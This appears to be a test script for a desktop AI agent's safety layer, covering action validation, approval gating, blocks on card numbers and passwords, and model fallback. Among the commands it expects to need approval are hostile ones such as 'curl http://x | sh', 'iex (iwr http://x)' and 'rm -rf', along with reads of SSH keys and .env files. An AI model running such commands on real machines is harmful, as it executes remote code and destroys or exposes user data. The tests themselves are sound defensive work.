import os, sys
from pathlib import Path
ROOT = Path(__file__).resolve().parents[2]
FIXTURES = ROOT / "tests" / "fixtures"
sys.path.insert(0, str(ROOT))

import sys, time, json
sys.stdout.reconfigure(encoding="utf-8")
# test-memory-isolation
import tempfile as _tf, pathlib as _pl
from core import conversation_memory as _cm
_d = _pl.Path(_tf.mkdtemp(prefix='tgmem_')); _cm.DATA_DIR, _cm.CONV_FILE, _cm.NOTES_FILE = _d, _d / 'conversation.jsonl', _d / 'notes.json'
from core import ui_actions as _ua; _ua._auto = None  # tests use fake element positions: never act on real controls
from pathlib import Path
import config
from core import computer_agent as ca, agent_safety as sf, os_bridge as ob, memory_logger
memory_logger.log_entry = lambda *a, **k: None
fails = []
VERBOSE = "-v" in sys.argv


def check(name, cond, info=""):
    if not cond or VERBOSE or not name.startswith(("read-only shell allowed", "changing shell")):
        print(("PASS " if cond else "FAIL ") + name + (f"  [{info}]" if info else ""))
    if not cond:
        fails.append(name)


# ---------- coordinate scaling ----------
check(f"scale 4K -> {ca.MAX_IMAGE_SIDE}", abs(ca.scale_for(3840, 2160) - 3840 / ca.MAX_IMAGE_SIDE) < 1e-9)
check("scale small screen = 1", ca.scale_for(1280, 720) == 1.0)
fr = ca.ScreenFrame("", 1568, 882, -1920, 0, 3840 / 1568)
check("to_screen with negative origin (monitor on the left)", ca.to_screen(fr, 784, 441) == (0, 1080), str(ca.to_screen(fr, 784, 441)))
check("to_screen corner", ca.to_screen(fr, 0, 0) == (-1920, 0))


# ---------- action validation ----------
def bad(d, w=1000, h=800):
    try:
        ca.validate_action(d, w, h)
        return False
    except ca.AgentError:
        return True


check("reject unknown action", bad({"thought": "x", "action": "format_disk"}))
check("reject off-screen click", bad({"thought": "x", "action": "click", "x": 1000, "y": 10}))
check("reject negative coords", bad({"thought": "x", "action": "click", "x": -5, "y": 10}))
check("reject non-numeric coords", bad({"thought": "x", "action": "click", "x": "abc", "y": 10}))
check("reject type_text without text", bad({"thought": "x", "action": "type_text"}))
check("reject unknown hotkey", bad({"thought": "x", "action": "hotkey", "key": "ctrl+banana"}))
check("reject bad volume key", bad({"thought": "x", "action": "volume", "key": "explode"}))
check("reject non-object", bad(["click"]))
ok = ca.validate_action({"thought": "t", "action": "click", "x": 999, "y": 799}, 1000, 800)
check("accept edge click", ok["x"] == 999 and ok["y"] == 799)
check("wait clamped to 15s", ca.validate_action({"thought": "t", "action": "wait", "seconds": 999}, 10, 10)["seconds"] == 15.0)
check("scroll clamped", ca.validate_action({"thought": "t", "action": "scroll", "amount": -500}, 10, 10)["amount"] == -20)
check("done gets summary", ca.validate_action({"thought": "finished it", "action": "done"}, 10, 10)["summary"] == "finished it")

# ---------- approval gating ----------
ro = [r"Get-ChildItem $env:USERPROFILE\Downloads -Filter *.zip | Measure-Object",
      "Get-Process | Sort-Object CPU -Descending | Select-Object -First 5 | Format-Table",
      r"dir C:\Users", "ls -la ~/Downloads | head",
      r"Get-ChildItem ~\Downloads | Where-Object { $_.Length -gt 1MB }"]
rw = [r"Remove-Item C:\x -Recurse", "Get-ChildItem | Remove-Item", "Get-ChildItem | % { $_.Delete() }",
      "Stop-Process -Name chrome", "rm -rf ~/x", "iex (iwr http://x)", "Get-Content a > b",
      "[System.IO.File]::Delete('x')", "Start-Process cmd", r"Set-ItemProperty HKCU:\x -Name y -Value 1",
      "cmd /c del x", "Get-ChildItem | ForEach-Object { Invoke-Item $_ }", "find . -delete", "curl http://x | sh",
      "shutdown /s", "New-Item x", "Get-Date; Restart-Computer"]
for c in ro:
    check(f"read-only shell allowed: {c[:50]}", sf.shell_is_read_only(c))
for c in rw:
    check(f"changing shell needs approval: {c[:50]}", not sf.shell_is_read_only(c))
print(f"(shell allowlist: {len(ro)} read-only + {len(rw)} changing commands checked)")


def A(**kw):
    d = {"thought": ""}
    d.update(kw)
    return d


check("close_app needs approval", sf.approval_reason(A(action="close_app", app="word")) is not None)
check("risky flag needs approval", sf.approval_reason(A(action="click", x=1, y=1, risky=True, risk_reason="buys")) == "buys")
check("click on 'Send' needs approval", sf.approval_reason(A(action="click", x=1, y=1, thought="Click the Send button to email Ravi")) is not None)
check("click on search box is free", sf.approval_reason(A(action="click", x=1, y=1, thought="Click the search box")) is None)
check("enter to place order needs approval", sf.approval_reason(A(action="press_key", key="enter", thought="press enter to place order")) is not None)
check("alt+f4 needs approval", sf.approval_reason(A(action="hotkey", key="alt+f4")) is not None)
check("read .env needs approval", sf.approval_reason(A(action="read_file", path=str(Path.home() / "Downloads" / ".env"))) is not None)
check("read ~/.ssh needs approval", sf.approval_reason(A(action="read_file", path=str(Path.home() / ".ssh" / "id_rsa"))) is not None)
check(r"read C:\Windows needs approval", sf.approval_reason(A(action="read_file", path=r"C:\Windows\win.ini")) is not None)
check("send Downloads file is free", sf.approval_reason(A(action="send_file_to_user", path=str(Path.home() / "Downloads" / "a.png"))) is None)
check("read-only shell is free", sf.approval_reason(A(action="run_shell", command=r"Get-ChildItem ~\Downloads")) is None)

# ---------- hard blocks ----------
check("block card number", sf.blocked_text_reason("4111 1111 1111 1111") is not None)
check("allow non-Luhn digits", sf.blocked_text_reason("1234567890123") is None)
check("block OTP", sf.blocked_text_reason("482913", "Type the OTP from SMS") is not None)
check("block password typing", sf.blocked_text_reason("hunter2", "type the password into the field") is not None)
check("allow normal text", sf.blocked_text_reason("luffy marineford thumbnail", "type the prompt") is None)

# ---------- agent loop with fake brain / fake screen / fake UI (nothing real is clicked) ----------
did = []
for name in ["mouse_click", "mouse_move", "mouse_drag", "mouse_scroll", "type_text", "press_key", "press_hotkey",
             "focus_window", "set_clipboard", "media_key"]:
    setattr(ob, name, (lambda n: (lambda *a, **k: did.append((n, a, k)) or True))(name))
ob.launch_app = lambda app: did.append(("launch_app", app)) or {"exit_code": 0, "stdout": f"Opened {app}", "stderr": ""}
ob.close_app = lambda app: did.append(("close_app", app)) or {"exit_code": 0, "stdout": "closed", "stderr": ""}
ob.run_command = lambda c, **k: did.append(("run_command", c)) or {"exit_code": 0, "stdout": "3", "stderr": ""}
ob.take_screenshot = lambda p, **k: (Path(p).write_bytes(b"x" * 10), True)[1]
ob.list_windows = lambda: [(1, "Notepad"), (2, "ChatGPT - Microsoft Edge")]
ob.release_input_lock = lambda: did.append(("release_lock",))
ca.capture_frame = lambda save_path=None: ca.ScreenFrame("AAAA", 1568, 882, 0, 0, 2.0, None)


class FakeUI(ca.AgentUI):
    def __init__(self, approve=True, answer="blue"):
        self.log, self.approve, self.answer, self.edits = [], approve, answer, 0

    def send_text(self, t):
        self.log.append(("text", t))
        return 1

    def edit_text(self, i, t):
        self.edits += 1

    def send_photo(self, p, c=""):
        self.log.append(("photo", c))

    def send_document(self, p, c=""):
        self.log.append(("doc", p))

    def request_approval(self, title, details, cancel):
        self.log.append(("approval", title))
        return self.approve

    def ask_user(self, q, cancel):
        self.log.append(("ask", q))
        return self.answer


class ScriptBrain(ca.Brain):
    name = "fake"

    def __init__(self, script, delay=0):
        self.script, self.i, self.delay, self.seen = list(script), 0, delay, []

    def next_action(self, task, frame, history, windows):
        self.seen.append(list(history))
        time.sleep(self.delay)
        a = self.script[min(self.i, len(self.script) - 1)]
        self.i += 1
        return a


def run(script, ui=None, delay=0, max_steps=10, stop_after=None):
    did.clear()
    ui = ui or FakeUI()
    brain = ScriptBrain(script, delay)
    ag = ca.ComputerAgent(ui, brain, max_steps=max_steps, require_approval=True, settle_sec=0.01)
    ag.submit("test task")
    t0 = time.time()
    time.sleep(0.05)
    if stop_after:
        time.sleep(stop_after)
        ui.log.append(("stopmsg", ag.stop()))
    while (ag.busy() or not ag.queue.empty()) and time.time() - t0 < 20:
        time.sleep(0.05)
    time.sleep(0.1)
    return ui, brain, ag


def photos(ui):
    return [c for k, c in ui.log if k == "photo"]


ui, br, ag = run([{"thought": "open notepad", "action": "open_app", "app": "notepad"},
                  {"thought": "click text area", "action": "click", "x": 100, "y": 50},
                  {"thought": "type hello", "action": "type_text", "text": "hello"},
                  {"thought": "all done", "action": "done", "summary": "Typed hello in Notepad"}])
clicks = [d for d in did if d[0] == "mouse_click"]
check("agent: runs steps in order",
      [d[0] for d in did if d[0] in ("launch_app", "mouse_click", "type_text")] == ["launch_app", "mouse_click", "type_text"], str(did))
check("agent: click mapped through scale 2.0", bool(clicks) and clicks[0][1][:2] == (200, 100), str(clicks))
check("agent: history fed back to model", any("open_app" in h for h in br.seen[-1]) and any("type_text" in h for h in br.seen[-1]))
check("agent: final photo with summary", any("Typed hello" in c for c in photos(ui)), str(ui.log))
check("agent: progress message edited (in background)", ui.edits >= 1, str(ui.edits))
check("agent: input lock released after steps", did.count(("release_lock",)) >= 3)

ui, br, ag = run([{"thought": "close word", "action": "close_app", "app": "word"},
                  {"thought": "ok", "action": "done", "summary": "gave up closing"}], ui=FakeUI(approve=False))
check("approval declined -> step not executed", not any(d[0] == "close_app" for d in did) and any(k == "approval" for k, _ in ui.log))
check("approval declined -> model told", any("DECLINED" in h for h in br.seen[-1]))

ui, br, ag = run([{"thought": "close word", "action": "close_app", "app": "word"},
                  {"thought": "ok", "action": "done", "summary": "closed"}], ui=FakeUI(approve=True))
check("approval granted -> executed", any(d[0] == "close_app" for d in did))

ui, br, ag = run([{"thought": "need color", "action": "ask_user", "question": "Which color?"},
                  {"thought": "ok", "action": "done", "summary": "used answer"}], ui=FakeUI(answer="blue"))
check("ask_user -> question sent", any(k == "ask" and "Which color?" in q for k, q in ui.log))
check("ask_user -> answer reaches model", any("user answered: blue" in h for h in br.seen[-1]))

ui, br, ag = run([{"thought": "type card", "action": "type_text", "text": "4111 1111 1111 1111"},
                  {"thought": "ok", "action": "done", "summary": "x"}])
check("card number never typed", not any(d[0] == "type_text" for d in did) and any("BLOCKED" in h for h in br.seen[-1]))

ui, br, ag = run([{"thought": "bad", "action": "nuke"}] * 5)
check("3 invalid replies -> stop", br.i == 3 and any("invalid" in c.lower() for c in photos(ui)), f"calls={br.i} {photos(ui)}")

ui, br, ag = run([{"thought": "wait", "action": "wait", "seconds": 1}] * 50, delay=0.2, max_steps=50, stop_after=0.8)
check("/stop cancels running task quickly", br.i < 10 and any("Stopped" in c for c in photos(ui)), f"steps={br.i} {ui.log[-2:]}")

ui, br, ag = run([{"thought": "scroll", "action": "scroll", "amount": -3}] * 50, max_steps=4)
check("step limit respected", br.i == 4 and any("limit" in c for c in photos(ui)), f"calls={br.i}")

ui, br, ag = run([{"thought": "count zips", "action": "run_shell", "command": r"Get-ChildItem ~\Downloads -Filter *.zip | Measure-Object"},
                  {"thought": "ok", "action": "done", "summary": "3 zips"}])
check("read-only shell runs without approval", any(d[0] == "run_command" for d in did) and not any(k == "approval" for k, _ in ui.log))

ui, br, ag = run([{"thought": "delete", "action": "run_shell", "command": r"Remove-Item ~\Downloads\x.zip"},
                  {"thought": "ok", "action": "done", "summary": "x"}], ui=FakeUI(approve=False))
check("changing shell blocked when declined", not any(d[0] == "run_command" for d in did) and any(k == "approval" for k, _ in ui.log))

# ---------- NEW: element clicks + batched actions ----------
from core import ui_elements as ue
ELS = [ue.UIElement(1, "Search", "Edit", 600, 400, 360, 60), ue.UIElement(2, "Upload", "Button", 980, 400, 100, 60)]
ca.capture_frame = lambda save_path=None, with_elements=True: ca.ScreenFrame("AAAA", 1280, 800, 0, 0, 1.5, None, list(ELS))
fr2 = ca.ScreenFrame("AAAA", 1280, 800, 0, 0, 1.5, None, list(ELS))
th, acts = ca.validate_step({"thought": "search", "actions": [
    {"action": "type_text", "element": 1, "text": "luffy"}, {"action": "press_key", "key": "enter"}]}, fr2)
check("batch: 2 actions accepted", [a["action"] for a in acts] == ["type_text", "press_key"])
check("element resolved to exact real-screen centre", acts[0]["_screen"] == (780, 430), str(acts[0].get("_screen")))
try:
    ca.validate_step({"thought": "x", "actions": [{"action": "click", "element": 99}]}, fr2); ok = False
except ca.AgentError:
    ok = True
check("unknown element number rejected", ok)
th, acts = ca.validate_step({"thought": "x", "actions": [
    {"action": "open_url", "url": "https://x.com"}, {"action": "click", "element": 2}, {"action": "done"}]}, fr2)
check("batch cut after screen-changing action", [a["action"] for a in acts] == ["open_url"])
th, acts = ca.validate_step({"thought": "x", "actions": [{"action": "wait", "seconds": 1}] * 9}, fr2)
check("batch capped at 5", len(acts) == 5)
th, acts = ca.validate_step({"thought": "old", "action": "click", "x": 10, "y": 10}, fr2)
check("old single-action format still accepted", len(acts) == 1 and acts[0]["action"] == "click")

ui, br, ag = run([{"thought": "search luffy and open upload", "actions": [
                      {"action": "type_text", "element": 1, "text": "luffy"},
                      {"action": "press_key", "key": "enter"},
                      {"action": "click", "element": 2}]},
                  {"thought": "done", "actions": [{"action": "done", "summary": "searched"}]}])
seq = [d[0] for d in did if d[0] in ("mouse_click", "type_text", "press_key")]
clicks = [d[1][:2] for d in did if d[0] == "mouse_click"]
check("one AI turn ran 3 actions", br.i == 2 and seq == ["mouse_click", "type_text", "press_key", "mouse_click"], f"turns={br.i} {seq}")
check("element clicks hit exact centres", clicks == [(780, 430), (1030, 430)], str(clicks))

# ---------- NEW: overloaded models are skipped (cooldown) ----------
import requests as _rq
from core import llm_router as lr
calls = []


class Busy:
    status_code = 503

    def json(self):
        return {"error": {"message": "This model is currently experiencing high demand."}}


class Good:
    status_code = 200

    def json(self):
        return {"candidates": [{"content": {"parts": [{"text": "{\"ok\": 1}"}]}}]}


def fake_post(url, **kw):
    calls.append(url.split("/models/")[1].split(":")[0])
    return Busy() if "flash-latest" in url and "lite" not in url else Good()


_rq.post = fake_post
config.GEMINI_API_KEY = "TESTKEY"
lr._MODEL_COOLDOWN.clear()
r1 = lr.call_gemini("p", "s", models=["gemini-flash-latest", "gemini-flash-lite-latest"])
r2 = lr.call_gemini("p", "s", models=["gemini-flash-latest", "gemini-flash-lite-latest"])
check("busy model tried once, then skipped", calls == ["gemini-flash-latest", "gemini-flash-lite-latest", "gemini-flash-lite-latest"]
      and "reply" in r1 and "reply" in r2, str(calls))
calls.clear()
lr._MODEL_COOLDOWN.clear()


def timeout_post(url, **kw):
    calls.append(url.split("/models/")[1].split(":")[0])
    if "lite" in url:
        raise _rq.exceptions.ReadTimeout("slow")
    return Good()


_rq.post = timeout_post
r3 = lr.call_gemini("p", "s", models=["gemini-flash-lite-latest", "gemini-flash-latest"])
r4 = lr.call_gemini("p", "s", models=["gemini-flash-lite-latest", "gemini-flash-latest"])
check("timed-out model skipped next time", calls == ["gemini-flash-lite-latest", "gemini-flash-latest", "gemini-flash-latest"], str(calls))
check("gone model gets long cooldown", lr._classify_error(404, "models/x is no longer available") == lr._GONE_COOLDOWN_SEC)
check("'generateContent' text is not mistaken for rate limit", lr._classify_error(400, "Invalid generateContent request") == 0)
lr._MODEL_COOLDOWN.clear()

# ---------- Gemini brain request shape (no network) ----------
import requests
sent = {}


class R:
    def json(self):
        return {"candidates": [{"content": {"parts": [{"text": json.dumps({"thought": "t", "action": "done", "summary": "s"})}]}}]}


requests.post = lambda url, **kw: (sent.update(url=url, **kw), R())[1]
config.GEMINI_API_KEY = "TESTKEY"
b = ca.GeminiBrain()
out = b.next_action("task", ca.ScreenFrame("QUJD", 800, 600, 0, 0, 1.0), ["1. x"], ["Notepad"])
parts = sent["json"]["contents"][0]["parts"]
check("gemini brain sends image + schema",
      parts[0]["inline_data"]["mime_type"] == "image/jpeg" and sent["json"]["generationConfig"]["responseSchema"]["required"] == ["thought", "actions"])
check("prompt includes ELEMENTS section", "ELEMENTS of the active window" in parts[1]["text"])
check("gemini brain returns action", out["action"] == "done")
print("\nFAILED:", fails if fails else "none")
sys.exit(1 if fails else 0)
